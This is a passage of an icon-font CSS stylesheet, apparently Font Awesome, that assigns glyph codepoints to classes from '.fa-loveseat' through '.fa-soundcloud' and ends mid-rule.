        .fa-loveseat:before {
            content: "\f4cc";
        }

        .fa-low-vision:before {
            content: "\f2a8";
        }

        .fa-luchador:before {
            content: "\f455";
        }

        .fa-luggage-cart:before {
            content: "\f59d";
        }

        .fa-lungs:before {
            content: "\f604";
        }

        .fa-lungs-virus:before {
            content: "\e067";
        }

        .fa-lyft:before {
            content: "\f3c3";
        }

        .fa-mace:before {
            content: "\f6f8";
        }

        .fa-magento:before {
            content: "\f3c4";
        }

        .fa-magic:before {
            content: "\f0d0";
        }

        .fa-magnet:before {
            content: "\f076";
        }

        .fa-mail-bulk:before {
            content: "\f674";
        }

        .fa-mailbox:before {
            content: "\f813";
        }

        .fa-mailchimp:before {
            content: "\f59e";
        }

        .fa-male:before {
            content: "\f183";
        }

        .fa-mandalorian:before {
            content: "\f50f";
        }

        .fa-mandolin:before {
            content: "\f6f9";
        }

        .fa-map:before {
            content: "\f279";
        }

        .fa-map-marked:before {
            content: "\f59f";
        }

        .fa-map-marked-alt:before {
            content: "\f5a0";
        }

        .fa-map-marker:before {
            content: "\f041";
        }

        .fa-map-marker-alt:before {
            content: "\f3c5";
        }

        .fa-map-marker-alt-slash:before {
            content: "\f605";
        }

        .fa-map-marker-check:before {
            content: "\f606";
        }

        .fa-map-marker-edit:before {
            content: "\f607";
        }

        .fa-map-marker-exclamation:before {
            content: "\f608";
        }

        .fa-map-marker-minus:before {
            content: "\f609";
        }

        .fa-map-marker-plus:before {
            content: "\f60a";
        }

        .fa-map-marker-question:before {
            content: "\f60b";
        }

        .fa-map-marker-slash:before {
            content: "\f60c";
        }

        .fa-map-marker-smile:before {
            content: "\f60d";
        }

        .fa-map-marker-times:before {
            content: "\f60e";
        }

        .fa-map-pin:before {
            content: "\f276";
        }

        .fa-map-signs:before {
            content: "\f277";
        }

        .fa-markdown:before {
            content: "\f60f";
        }

        .fa-marker:before {
            content: "\f5a1";
        }

        .fa-mars:before {
            content: "\f222";
        }

        .fa-mars-double:before {
            content: "\f227";
        }

        .fa-mars-stroke:before {
            content: "\f229";
        }

        .fa-mars-stroke-h:before {
            content: "\f22b";
        }

        .fa-mars-stroke-v:before {
            content: "\f22a";
        }

        .fa-mask:before {
            content: "\f6fa";
        }

        .fa-mastodon:before {
            content: "\f4f6";
        }

        .fa-maxcdn:before {
            content: "\f136";
        }

        .fa-mdb:before {
            content: "\f8ca";
        }

        .fa-meat:before {
            content: "\f814";
        }

        .fa-medal:before {
            content: "\f5a2";
        }

        .fa-medapps:before {
            content: "\f3c6";
        }

        .fa-medium:before {
            content: "\f23a";
        }

        .fa-medium-m:before {
            content: "\f3c7";
        }

        .fa-medkit:before {
            content: "\f0fa";
        }

        .fa-medrt:before {
            content: "\f3c8";
        }

        .fa-meetup:before {
            content: "\f2e0";
        }

        .fa-megaphone:before {
            content: "\f675";
        }

        .fa-megaport:before {
            content: "\f5a3";
        }

        .fa-meh:before {
            content: "\f11a";
        }

        .fa-meh-blank:before {
            content: "\f5a4";
        }

        .fa-meh-rolling-eyes:before {
            content: "\f5a5";
        }

        .fa-memory:before {
            content: "\f538";
        }

        .fa-mendeley:before {
            content: "\f7b3";
        }

        .fa-menorah:before {
            content: "\f676";
        }

        .fa-mercury:before {
            content: "\f223";
        }

        .fa-meteor:before {
            content: "\f753";
        }

        .fa-microblog:before {
            content: "\e01a";
        }

        .fa-microchip:before {
            content: "\f2db";
        }

        .fa-microphone:before {
            content: "\f130";
        }

        .fa-microphone-alt:before {
            content: "\f3c9";
        }

        .fa-microphone-alt-slash:before {
            content: "\f539";
        }

        .fa-microphone-slash:before {
            content: "\f131";
        }

        .fa-microphone-stand:before {
            content: "\f8cb";
        }

        .fa-microscope:before {
            content: "\f610";
        }

        .fa-microsoft:before {
            content: "\f3ca";
        }

        .fa-microwave:before {
            content: "\e01b";
        }

        .fa-mind-share:before {
            content: "\f677";
        }

        .fa-minus:before {
            content: "\f068";
        }

        .fa-minus-circle:before {
            content: "\f056";
        }

        .fa-minus-hexagon:before {
            content: "\f307";
        }

        .fa-minus-octagon:before {
            content: "\f308";
        }

        .fa-minus-square:before {
            content: "\f146";
        }

        .fa-mistletoe:before {
            content: "\f7b4";
        }

        .fa-mitten:before {
            content: "\f7b5";
        }

        .fa-mix:before {
            content: "\f3cb";
        }

        .fa-mixcloud:before {
            content: "\f289";
        }

        .fa-mixer:before {
            content: "\e056";
        }

        .fa-mizuni:before {
            content: "\f3cc";
        }

        .fa-mobile:before {
            content: "\f10b";
        }

        .fa-mobile-alt:before {
            content: "\f3cd";
        }

        .fa-mobile-android:before {
            content: "\f3ce";
        }

        .fa-mobile-android-alt:before {
            content: "\f3cf";
        }

        .fa-modx:before {
            content: "\f285";
        }

        .fa-monero:before {
            content: "\f3d0";
        }

        .fa-money-bill:before {
            content: "\f0d6";
        }

        .fa-money-bill-alt:before {
            content: "\f3d1";
        }

        .fa-money-bill-wave:before {
            content: "\f53a";
        }

        .fa-money-bill-wave-alt:before {
            content: "\f53b";
        }

        .fa-money-check:before {
            content: "\f53c";
        }

        .fa-money-check-alt:before {
            content: "\f53d";
        }

        .fa-money-check-edit:before {
            content: "\f872";
        }

        .fa-money-check-edit-alt:before {
            content: "\f873";
        }

        .fa-monitor-heart-rate:before {
            content: "\f611";
        }

        .fa-monkey:before {
            content: "\f6fb";
        }

        .fa-monument:before {
            content: "\f5a6";
        }

        .fa-moon:before {
            content: "\f186";
        }

        .fa-moon-cloud:before {
            content: "\f754";
        }

        .fa-moon-stars:before {
            content: "\f755";
        }

        .fa-mortar-pestle:before {
            content: "\f5a7";
        }

        .fa-mosque:before {
            content: "\f678";
        }

        .fa-motorcycle:before {
            content: "\f21c";
        }

        .fa-mountain:before {
            content: "\f6fc";
        }

        .fa-mountains:before {
            content: "\f6fd";
        }

        .fa-mouse:before {
            content: "\f8cc";
        }

        .fa-mouse-alt:before {
            content: "\f8cd";
        }

        .fa-mouse-pointer:before {
            content: "\f245";
        }

        .fa-mp3-player:before {
            content: "\f8ce";
        }

        .fa-mug:before {
            content: "\f874";
        }

        .fa-mug-hot:before {
            content: "\f7b6";
        }

        .fa-mug-marshmallows:before {
            content: "\f7b7";
        }

        .fa-mug-tea:before {
            content: "\f875";
        }

        .fa-music:before {
            content: "\f001";
        }

        .fa-music-alt:before {
            content: "\f8cf";
        }

        .fa-music-alt-slash:before {
            content: "\f8d0";
        }

        .fa-music-slash:before {
            content: "\f8d1";
        }

        .fa-napster:before {
            content: "\f3d2";
        }

        .fa-narwhal:before {
            content: "\f6fe";
        }

        .fa-neos:before {
            content: "\f612";
        }

        .fa-network-wired:before {
            content: "\f6ff";
        }

        .fa-neuter:before {
            content: "\f22c";
        }

        .fa-newspaper:before {
            content: "\f1ea";
        }

        .fa-nimblr:before {
            content: "\f5a8";
        }

        .fa-node:before {
            content: "\f419";
        }

        .fa-node-js:before {
            content: "\f3d3";
        }

        .fa-not-equal:before {
            content: "\f53e";
        }

        .fa-notes-medical:before {
            content: "\f481";
        }

        .fa-npm:before {
            content: "\f3d4";
        }

        .fa-ns8:before {
            content: "\f3d5";
        }

        .fa-nutritionix:before {
            content: "\f3d6";
        }

        .fa-object-group:before {
            content: "\f247";
        }

        .fa-object-ungroup:before {
            content: "\f248";
        }

        .fa-octagon:before {
            content: "\f306";
        }

        .fa-octopus-deploy:before {
            content: "\e082";
        }

        .fa-odnoklassniki:before {
            content: "\f263";
        }

        .fa-odnoklassniki-square:before {
            content: "\f264";
        }

        .fa-oil-can:before {
            content: "\f613";
        }

        .fa-oil-temp:before {
            content: "\f614";
        }

        .fa-old-republic:before {
            content: "\f510";
        }

        .fa-om:before {
            content: "\f679";
        }

        .fa-omega:before {
            content: "\f67a";
        }

        .fa-opencart:before {
            content: "\f23d";
        }

        .fa-openid:before {
            content: "\f19b";
        }

        .fa-opera:before {
            content: "\f26a";
        }

        .fa-optin-monster:before {
            content: "\f23c";
        }

        .fa-orcid:before {
            content: "\f8d2";
        }

        .fa-ornament:before {
            content: "\f7b8";
        }

        .fa-osi:before {
            content: "\f41a";
        }

        .fa-otter:before {
            content: "\f700";
        }

        .fa-outdent:before {
            content: "\f03b";
        }

        .fa-outlet:before {
            content: "\e01c";
        }

        .fa-oven:before {
            content: "\e01d";
        }

        .fa-overline:before {
            content: "\f876";
        }

        .fa-page-break:before {
            content: "\f877";
        }

        .fa-page4:before {
            content: "\f3d7";
        }

        .fa-pagelines:before {
            content: "\f18c";
        }

        .fa-pager:before {
            content: "\f815";
        }

        .fa-paint-brush:before {
            content: "\f1fc";
        }

        .fa-paint-brush-alt:before {
            content: "\f5a9";
        }

        .fa-paint-roller:before {
            content: "\f5aa";
        }

        .fa-palette:before {
            content: "\f53f";
        }

        .fa-palfed:before {
            content: "\f3d8";
        }

        .fa-pallet:before {
            content: "\f482";
        }

        .fa-pallet-alt:before {
            content: "\f483";
        }

        .fa-paper-plane:before {
            content: "\f1d8";
        }

        .fa-paperclip:before {
            content: "\f0c6";
        }

        .fa-parachute-box:before {
            content: "\f4cd";
        }

        .fa-paragraph:before {
            content: "\f1dd";
        }

        .fa-paragraph-rtl:before {
            content: "\f878";
        }

        .fa-parking:before {
            content: "\f540";
        }

        .fa-parking-circle:before {
            content: "\f615";
        }

        .fa-parking-circle-slash:before {
            content: "\f616";
        }

        .fa-parking-slash:before {
            content: "\f617";
        }

        .fa-passport:before {
            content: "\f5ab";
        }

        .fa-pastafarianism:before {
            content: "\f67b";
        }

        .fa-paste:before {
            content: "\f0ea";
        }

        .fa-patreon:before {
            content: "\f3d9";
        }

        .fa-pause:before {
            content: "\f04c";
        }

        .fa-pause-circle:before {
            content: "\f28b";
        }

        .fa-paw:before {
            content: "\f1b0";
        }

        .fa-paw-alt:before {
            content: "\f701";
        }

        .fa-paw-claws:before {
            content: "\f702";
        }

        .fa-paypal:before {
            content: "\f1ed";
        }

        .fa-peace:before {
            content: "\f67c";
        }

        .fa-pegasus:before {
            content: "\f703";
        }

        .fa-pen:before {
            content: "\f304";
        }

        .fa-pen-alt:before {
            content: "\f305";
        }

        .fa-pen-fancy:before {
            content: "\f5ac";
        }

        .fa-pen-nib:before {
            content: "\f5ad";
        }

        .fa-pen-square:before {
            content: "\f14b";
        }

        .fa-pencil:before {
            content: "\f040";
        }

        .fa-pencil-alt:before {
            content: "\f303";
        }

        .fa-pencil-paintbrush:before {
            content: "\f618";
        }

        .fa-pencil-ruler:before {
            content: "\f5ae";
        }

        .fa-pennant:before {
            content: "\f456";
        }

        .fa-penny-arcade:before {
            content: "\f704";
        }

        .fa-people-arrows:before {
            content: "\e068";
        }

        .fa-people-carry:before {
            content: "\f4ce";
        }

        .fa-pepper-hot:before {
            content: "\f816";
        }

        .fa-perbyte:before {
            content: "\e083";
        }

        .fa-percent:before {
            content: "\f295";
        }

        .fa-percentage:before {
            content: "\f541";
        }

        .fa-periscope:before {
            content: "\f3da";
        }

        .fa-person-booth:before {
            content: "\f756";
        }

        .fa-person-carry:before {
            content: "\f4cf";
        }

        .fa-person-dolly:before {
            content: "\f4d0";
        }

        .fa-person-dolly-empty:before {
            content: "\f4d1";
        }

        .fa-person-sign:before {
            content: "\f757";
        }

        .fa-phabricator:before {
            content: "\f3db";
        }

        .fa-phoenix-framework:before {
            content: "\f3dc";
        }

        .fa-phoenix-squadron:before {
            content: "\f511";
        }

        .fa-phone:before {
            content: "\f095";
        }

        .fa-phone-alt:before {
            content: "\f879";
        }

        .fa-phone-laptop:before {
            content: "\f87a";
        }

        .fa-phone-office:before {
            content: "\f67d";
        }

        .fa-phone-plus:before {
            content: "\f4d2";
        }

        .fa-phone-rotary:before {
            content: "\f8d3";
        }

        .fa-phone-slash:before {
            content: "\f3dd";
        }

        .fa-phone-square:before {
            content: "\f098";
        }

        .fa-phone-square-alt:before {
            content: "\f87b";
        }

        .fa-phone-volume:before {
            content: "\f2a0";
        }

        .fa-photo-video:before {
            content: "\f87c";
        }

        .fa-php:before {
            content: "\f457";
        }

        .fa-pi:before {
            content: "\f67e";
        }

        .fa-piano:before {
            content: "\f8d4";
        }

        .fa-piano-keyboard:before {
            content: "\f8d5";
        }

        .fa-pie:before {
            content: "\f705";
        }

        .fa-pied-piper:before {
            content: "\f2ae";
        }

        .fa-pied-piper-alt:before {
            content: "\f1a8";
        }

        .fa-pied-piper-hat:before {
            content: "\f4e5";
        }

        .fa-pied-piper-pp:before {
            content: "\f1a7";
        }

        .fa-pied-piper-square:before {
            content: "\e01e";
        }

        .fa-pig:before {
            content: "\f706";
        }

        .fa-piggy-bank:before {
            content: "\f4d3";
        }

        .fa-pills:before {
            content: "\f484";
        }

        .fa-pinterest:before {
            content: "\f0d2";
        }

        .fa-pinterest-p:before {
            content: "\f231";
        }

        .fa-pinterest-square:before {
            content: "\f0d3";
        }

        .fa-pizza:before {
            content: "\f817";
        }

        .fa-pizza-slice:before {
            content: "\f818";
        }

        .fa-place-of-worship:before {
            content: "\f67f";
        }

        .fa-plane:before {
            content: "\f072";
        }

        .fa-plane-alt:before {
            content: "\f3de";
        }

        .fa-plane-arrival:before {
            content: "\f5af";
        }

        .fa-plane-departure:before {
            content: "\f5b0";
        }

        .fa-plane-slash:before {
            content: "\e069";
        }

        .fa-planet-moon:before {
            content: "\e01f";
        }

        .fa-planet-ringed:before {
            content: "\e020";
        }

        .fa-play:before {
            content: "\f04b";
        }

        .fa-play-circle:before {
            content: "\f144";
        }

        .fa-playstation:before {
            content: "\f3df";
        }

        .fa-plug:before {
            content: "\f1e6";
        }

        .fa-plus:before {
            content: "\f067";
        }

        .fa-plus-circle:before {
            content: "\f055";
        }

        .fa-plus-hexagon:before {
            content: "\f300";
        }

        .fa-plus-octagon:before {
            content: "\f301";
        }

        .fa-plus-square:before {
            content: "\f0fe";
        }

        .fa-podcast:before {
            content: "\f2ce";
        }

        .fa-podium:before {
            content: "\f680";
        }

        .fa-podium-star:before {
            content: "\f758";
        }

        .fa-police-box:before {
            content: "\e021";
        }

        .fa-poll:before {
            content: "\f681";
        }

        .fa-poll-h:before {
            content: "\f682";
        }

        .fa-poll-people:before {
            content: "\f759";
        }

        .fa-poo:before {
            content: "\f2fe";
        }

        .fa-poo-storm:before {
            content: "\f75a";
        }

        .fa-poop:before {
            content: "\f619";
        }

        .fa-popcorn:before {
            content: "\f819";
        }

        .fa-portal-enter:before {
            content: "\e022";
        }

        .fa-portal-exit:before {
            content: "\e023";
        }

        .fa-portrait:before {
            content: "\f3e0";
        }

        .fa-pound-sign:before {
            content: "\f154";
        }

        .fa-power-off:before {
            content: "\f011";
        }

        .fa-pray:before {
            content: "\f683";
        }

        .fa-praying-hands:before {
            content: "\f684";
        }

        .fa-prescription:before {
            content: "\f5b1";
        }

        .fa-prescription-bottle:before {
            content: "\f485";
        }

        .fa-prescription-bottle-alt:before {
            content: "\f486";
        }

        .fa-presentation:before {
            content: "\f685";
        }

        .fa-print:before {
            content: "\f02f";
        }

        .fa-print-search:before {
            content: "\f81a";
        }

        .fa-print-slash:before {
            content: "\f686";
        }

        .fa-procedures:before {
            content: "\f487";
        }

        .fa-product-hunt:before {
            content: "\f288";
        }

        .fa-project-diagram:before {
            content: "\f542";
        }

        .fa-projector:before {
            content: "\f8d6";
        }

        .fa-pump-medical:before {
            content: "\e06a";
        }

        .fa-pump-soap:before {
            content: "\e06b";
        }

        .fa-pumpkin:before {
            content: "\f707";
        }

        .fa-pushed:before {
            content: "\f3e1";
        }

        .fa-puzzle-piece:before {
            content: "\f12e";
        }

        .fa-python:before {
            content: "\f3e2";
        }

        .fa-qq:before {
            content: "\f1d6";
        }

        .fa-qrcode:before {
            content: "\f029";
        }

        .fa-question:before {
            content: "\f128";
        }

        .fa-question-circle:before {
            content: "\f059";
        }

        .fa-question-square:before {
            content: "\f2fd";
        }

        .fa-quidditch:before {
            content: "\f458";
        }

        .fa-quinscape:before {
            content: "\f459";
        }

        .fa-quora:before {
            content: "\f2c4";
        }

        .fa-quote-left:before {
            content: "\f10d";
        }

        .fa-quote-right:before {
            content: "\f10e";
        }

        .fa-quran:before {
            content: "\f687";
        }

        .fa-r-project:before {
            content: "\f4f7";
        }

        .fa-rabbit:before {
            content: "\f708";
        }

        .fa-rabbit-fast:before {
            content: "\f709";
        }

        .fa-racquet:before {
            content: "\f45a";
        }

        .fa-radar:before {
            content: "\e024";
        }

        .fa-radiation:before {
            content: "\f7b9";
        }

        .fa-radiation-alt:before {
            content: "\f7ba";
        }

        .fa-radio:before {
            content: "\f8d7";
        }

        .fa-radio-alt:before {
            content: "\f8d8";
        }

        .fa-rainbow:before {
            content: "\f75b";
        }

        .fa-raindrops:before {
            content: "\f75c";
        }

        .fa-ram:before {
            content: "\f70a";
        }

        .fa-ramp-loading:before {
            content: "\f4d4";
        }

        .fa-random:before {
            content: "\f074";
        }

        .fa-raspberry-pi:before {
            content: "\f7bb";
        }

        .fa-ravelry:before {
            content: "\f2d9";
        }

        .fa-raygun:before {
            content: "\e025";
        }

        .fa-react:before {
            content: "\f41b";
        }

        .fa-reacteurope:before {
            content: "\f75d";
        }

        .fa-readme:before {
            content: "\f4d5";
        }

        .fa-rebel:before {
            content: "\f1d0";
        }

        .fa-receipt:before {
            content: "\f543";
        }

        .fa-record-vinyl:before {
            content: "\f8d9";
        }

        .fa-rectangle-landscape:before {
            content: "\f2fa";
        }

        .fa-rectangle-portrait:before {
            content: "\f2fb";
        }

        .fa-rectangle-wide:before {
            content: "\f2fc";
        }

        .fa-recycle:before {
            content: "\f1b8";
        }

        .fa-red-river:before {
            content: "\f3e3";
        }

        .fa-reddit:before {
            content: "\f1a1";
        }

        .fa-reddit-alien:before {
            content: "\f281";
        }

        .fa-reddit-square:before {
            content: "\f1a2";
        }

        .fa-redhat:before {
            content: "\f7bc";
        }

        .fa-redo:before {
            content: "\f01e";
        }

        .fa-redo-alt:before {
            content: "\f2f9";
        }

        .fa-refrigerator:before {
            content: "\e026";
        }

        .fa-registered:before {
            content: "\f25d";
        }

        .fa-remove-format:before {
            content: "\f87d";
        }

        .fa-renren:before {
            content: "\f18b";
        }

        .fa-repeat:before {
            content: "\f363";
        }

        .fa-repeat-1:before {
            content: "\f365";
        }

        .fa-repeat-1-alt:before {
            content: "\f366";
        }

        .fa-repeat-alt:before {
            content: "\f364";
        }

        .fa-reply:before {
            content: "\f3e5";
        }

        .fa-reply-all:before {
            content: "\f122";
        }

        .fa-replyd:before {
            content: "\f3e6";
        }

        .fa-republican:before {
            content: "\f75e";
        }

        .fa-researchgate:before {
            content: "\f4f8";
        }

        .fa-resolving:before {
            content: "\f3e7";
        }

        .fa-restroom:before {
            content: "\f7bd";
        }

        .fa-retweet:before {
            content: "\f079";
        }

        .fa-retweet-alt:before {
            content: "\f361";
        }

        .fa-rev:before {
            content: "\f5b2";
        }

        .fa-ribbon:before {
            content: "\f4d6";
        }

        .fa-ring:before {
            content: "\f70b";
        }

        .fa-rings-wedding:before {
            content: "\f81b";
        }

        .fa-road:before {
            content: "\f018";
        }

        .fa-robot:before {
            content: "\f544";
        }

        .fa-rocket:before {
            content: "\f135";
        }

        .fa-rocket-launch:before {
            content: "\e027";
        }

        .fa-rocketchat:before {
            content: "\f3e8";
        }

        .fa-rockrms:before {
            content: "\f3e9";
        }

        .fa-route:before {
            content: "\f4d7";
        }

        .fa-route-highway:before {
            content: "\f61a";
        }

        .fa-route-interstate:before {
            content: "\f61b";
        }

        .fa-router:before {
            content: "\f8da";
        }

        .fa-rss:before {
            content: "\f09e";
        }

        .fa-rss-square:before {
            content: "\f143";
        }

        .fa-ruble-sign:before {
            content: "\f158";
        }

        .fa-ruler:before {
            content: "\f545";
        }

        .fa-ruler-combined:before {
            content: "\f546";
        }

        .fa-ruler-horizontal:before {
            content: "\f547";
        }

        .fa-ruler-triangle:before {
            content: "\f61c";
        }

        .fa-ruler-vertical:before {
            content: "\f548";
        }

        .fa-running:before {
            content: "\f70c";
        }

        .fa-rupee-sign:before {
            content: "\f156";
        }

        .fa-rust:before {
            content: "\e07a";
        }

        .fa-rv:before {
            content: "\f7be";
        }

        .fa-sack:before {
            content: "\f81c";
        }

        .fa-sack-dollar:before {
            content: "\f81d";
        }

        .fa-sad-cry:before {
            content: "\f5b3";
        }

        .fa-sad-tear:before {
            content: "\f5b4";
        }

        .fa-safari:before {
            content: "\f267";
        }

        .fa-salad:before {
            content: "\f81e";
        }

        .fa-salesforce:before {
            content: "\f83b";
        }

        .fa-sandwich:before {
            content: "\f81f";
        }

        .fa-sass:before {
            content: "\f41e";
        }

        .fa-satellite:before {
            content: "\f7bf";
        }

        .fa-satellite-dish:before {
            content: "\f7c0";
        }

        .fa-sausage:before {
            content: "\f820";
        }

        .fa-save:before {
            content: "\f0c7";
        }

        .fa-sax-hot:before {
            content: "\f8db";
        }

        .fa-saxophone:before {
            content: "\f8dc";
        }

        .fa-scalpel:before {
            content: "\f61d";
        }

        .fa-scalpel-path:before {
            content: "\f61e";
        }

        .fa-scanner:before {
            content: "\f488";
        }

        .fa-scanner-image:before {
            content: "\f8f3";
        }

        .fa-scanner-keyboard:before {
            content: "\f489";
        }

        .fa-scanner-touchscreen:before {
            content: "\f48a";
        }

        .fa-scarecrow:before {
            content: "\f70d";
        }

        .fa-scarf:before {
            content: "\f7c1";
        }

        .fa-schlix:before {
            content: "\f3ea";
        }

        .fa-school:before {
            content: "\f549";
        }

        .fa-screwdriver:before {
            content: "\f54a";
        }

        .fa-scribd:before {
            content: "\f28a";
        }

        .fa-scroll:before {
            content: "\f70e";
        }

        .fa-scroll-old:before {
            content: "\f70f";
        }

        .fa-scrubber:before {
            content: "\f2f8";
        }

        .fa-scythe:before {
            content: "\f710";
        }

        .fa-sd-card:before {
            content: "\f7c2";
        }

        .fa-search:before {
            content: "\f002";
        }

        .fa-search-dollar:before {
            content: "\f688";
        }

        .fa-search-location:before {
            content: "\f689";
        }

        .fa-search-minus:before {
            content: "\f010";
        }

        .fa-search-plus:before {
            content: "\f00e";
        }

        .fa-searchengin:before {
            content: "\f3eb";
        }

        .fa-seedling:before {
            content: "\f4d8";
        }

        .fa-sellcast:before {
            content: "\f2da";
        }

        .fa-sellsy:before {
            content: "\f213";
        }

        .fa-send-back:before {
            content: "\f87e";
        }

        .fa-send-backward:before {
            content: "\f87f";
        }

        .fa-sensor:before {
            content: "\e028";
        }

        .fa-sensor-alert:before {
            content: "\e029";
        }

        .fa-sensor-fire:before {
            content: "\e02a";
        }

        .fa-sensor-on:before {
            content: "\e02b";
        }

        .fa-sensor-smoke:before {
            content: "\e02c";
        }

        .fa-server:before {
            content: "\f233";
        }

        .fa-servicestack:before {
            content: "\f3ec";
        }

        .fa-shapes:before {
            content: "\f61f";
        }

        .fa-share:before {
            content: "\f064";
        }

        .fa-share-all:before {
            content: "\f367";
        }

        .fa-share-alt:before {
            content: "\f1e0";
        }

        .fa-share-alt-square:before {
            content: "\f1e1";
        }

        .fa-share-square:before {
            content: "\f14d";
        }

        .fa-sheep:before {
            content: "\f711";
        }

        .fa-shekel-sign:before {
            content: "\f20b";
        }

        .fa-shield:before {
            content: "\f132";
        }

        .fa-shield-alt:before {
            content: "\f3ed";
        }

        .fa-shield-check:before {
            content: "\f2f7";
        }

        .fa-shield-cross:before {
            content: "\f712";
        }

        .fa-shield-virus:before {
            content: "\e06c";
        }

        .fa-ship:before {
            content: "\f21a";
        }

        .fa-shipping-fast:before {
            content: "\f48b";
        }

        .fa-shipping-timed:before {
            content: "\f48c";
        }

        .fa-shirtsinbulk:before {
            content: "\f214";
        }

        .fa-shish-kebab:before {
            content: "\f821";
        }

        .fa-shoe-prints:before {
            content: "\f54b";
        }

        .fa-shopify:before {
            content: "\e057";
        }

        .fa-shopping-bag:before {
            content: "\f290";
        }

        .fa-shopping-basket:before {
            content: "\f291";
        }

        .fa-shopping-cart:before {
            content: "\f07a";
        }

        .fa-shopware:before {
            content: "\f5b5";
        }

        .fa-shovel:before {
            content: "\f713";
        }

        .fa-shovel-snow:before {
            content: "\f7c3";
        }

        .fa-shower:before {
            content: "\f2cc";
        }

        .fa-shredder:before {
            content: "\f68a";
        }

        .fa-shuttle-van:before {
            content: "\f5b6";
        }

        .fa-shuttlecock:before {
            content: "\f45b";
        }

        .fa-sickle:before {
            content: "\f822";
        }

        .fa-sigma:before {
            content: "\f68b";
        }

        .fa-sign:before {
            content: "\f4d9";
        }

        .fa-sign-in:before {
            content: "\f090";
        }

        .fa-sign-in-alt:before {
            content: "\f2f6";
        }

        .fa-sign-language:before {
            content: "\f2a7";
        }

        .fa-sign-out:before {
            content: "\f08b";
        }

        .fa-sign-out-alt:before {
            content: "\f2f5";
        }

        .fa-signal:before {
            content: "\f012";
        }

        .fa-signal-1:before {
            content: "\f68c";
        }

        .fa-signal-2:before {
            content: "\f68d";
        }

        .fa-signal-3:before {
            content: "\f68e";
        }

        .fa-signal-4:before {
            content: "\f68f";
        }

        .fa-signal-alt:before {
            content: "\f690";
        }

        .fa-signal-alt-1:before {
            content: "\f691";
        }

        .fa-signal-alt-2:before {
            content: "\f692";
        }

        .fa-signal-alt-3:before {
            content: "\f693";
        }

        .fa-signal-alt-slash:before {
            content: "\f694";
        }

        .fa-signal-slash:before {
            content: "\f695";
        }

        .fa-signal-stream:before {
            content: "\f8dd";
        }

        .fa-signature:before {
            content: "\f5b7";
        }

        .fa-sim-card:before {
            content: "\f7c4";
        }

        .fa-simplybuilt:before {
            content: "\f215";
        }

        .fa-sink:before {
            content: "\e06d";
        }

        .fa-siren:before {
            content: "\e02d";
        }

        .fa-siren-on:before {
            content: "\e02e";
        }

        .fa-sistrix:before {
            content: "\f3ee";
        }

        .fa-sitemap:before {
            content: "\f0e8";
        }

        .fa-sith:before {
            content: "\f512";
        }

        .fa-skating:before {
            content: "\f7c5";
        }

        .fa-skeleton:before {
            content: "\f620";
        }

        .fa-sketch:before {
            content: "\f7c6";
        }

        .fa-ski-jump:before {
            content: "\f7c7";
        }

        .fa-ski-lift:before {
            content: "\f7c8";
        }

        .fa-skiing:before {
            content: "\f7c9";
        }

        .fa-skiing-nordic:before {
            content: "\f7ca";
        }

        .fa-skull:before {
            content: "\f54c";
        }

        .fa-skull-cow:before {
            content: "\f8de";
        }

        .fa-skull-crossbones:before {
            content: "\f714";
        }

        .fa-skyatlas:before {
            content: "\f216";
        }

        .fa-skype:before {
            content: "\f17e";
        }

        .fa-slack:before {
            content: "\f198";
        }

        .fa-slack-hash:before {
            content: "\f3ef";
        }

        .fa-slash:before {
            content: "\f715";
        }

        .fa-sledding:before {
            content: "\f7cb";
        }

        .fa-sleigh:before {
            content: "\f7cc";
        }

        .fa-sliders-h:before {
            content: "\f1de";
        }

        .fa-sliders-h-square:before {
            content: "\f3f0";
        }

        .fa-sliders-v:before {
            content: "\f3f1";
        }

        .fa-sliders-v-square:before {
            content: "\f3f2";
        }

        .fa-slideshare:before {
            content: "\f1e7";
        }

        .fa-smile:before {
            content: "\f118";
        }

        .fa-smile-beam:before {
            content: "\f5b8";
        }

        .fa-smile-plus:before {
            content: "\f5b9";
        }

        .fa-smile-wink:before {
            content: "\f4da";
        }

        .fa-smog:before {
            content: "\f75f";
        }

        .fa-smoke:before {
            content: "\f760";
        }

        .fa-smoking:before {
            content: "\f48d";
        }

        .fa-smoking-ban:before {
            content: "\f54d";
        }

        .fa-sms:before {
            content: "\f7cd";
        }

        .fa-snake:before {
            content: "\f716";
        }

        .fa-snapchat:before {
            content: "\f2ab";
        }

        .fa-snapchat-ghost:before {
            content: "\f2ac";
        }

        .fa-snapchat-square:before {
            content: "\f2ad";
        }

        .fa-snooze:before {
            content: "\f880";
        }

        .fa-snow-blowing:before {
            content: "\f761";
        }

        .fa-snowboarding:before {
            content: "\f7ce";
        }

        .fa-snowflake:before {
            content: "\f2dc";
        }

        .fa-snowflakes:before {
            content: "\f7cf";
        }

        .fa-snowman:before {
            content: "\f7d0";
        }

        .fa-snowmobile:before {
            content: "\f7d1";
        }

        .fa-snowplow:before {
            content: "\f7d2";
        }

        .fa-soap:before {
            content: "\e06e";
        }

        .fa-socks:before {
            content: "\f696";
        }

        .fa-solar-panel:before {
            content: "\f5ba";
        }

        .fa-solar-system:before {
            content: "\e02f";
        }

        .fa-sort:before {
            content: "\f0dc";
        }

        .fa-sort-alpha-down:before {
            content: "\f15d";
        }

        .fa-sort-alpha-down-alt:before {
            content: "\f881";
        }

        .fa-sort-alpha-up:before {
            content: "\f15e";
        }

        .fa-sort-alpha-up-alt:before {
            content: "\f882";
        }

        .fa-sort-alt:before {
            content: "\f883";
        }

        .fa-sort-amount-down:before {
            content: "\f160";
        }

        .fa-sort-amount-down-alt:before {
            content: "\f884";
        }

        .fa-sort-amount-up:before {
            content: "\f161";
        }

        .fa-sort-amount-up-alt:before {
            content: "\f885";
        }

        .fa-sort-circle:before {
            content: "\e030";
        }

        .fa-sort-circle-down:before {
            content: "\e031";
        }

        .fa-sort-circle-up:before {
            content: "\e032";
        }

        .fa-sort-down:before {
            content: "\f0dd";
        }

        .fa-sort-numeric-down:before {
            content: "\f162";
        }

        .fa-sort-numeric-down-alt:before {
            content: "\f886";
        }

        .fa-sort-numeric-up:before {
            content: "\f163";
        }

        .fa-sort-numeric-up-alt:before {
            content: "\f887";
        }

        .fa-sort-shapes-down:before {
            content: "\f888";
        }

        .fa-sort-shapes-down-alt:before {
            content: "\f889";
        }

        .fa-sort-shapes-up:before {
            content: "\f88a";
        }

        .fa-sort-shapes-up-alt:before {
            content: "\f88b";
        }

        .fa-sort-size-down:before {
            content: "\f88c";
        }

        .fa-sort-size-down-alt:before {
            content: "\f88d";
        }

        .fa-sort-size-up:before {
            content: "\f88e";
        }

        .fa-sort-size-up-alt:before {
            content: "\f88f";
        }

        .fa-sort-up:before {
            content: "\f0de";
        }

        .fa-soundcloud:before {
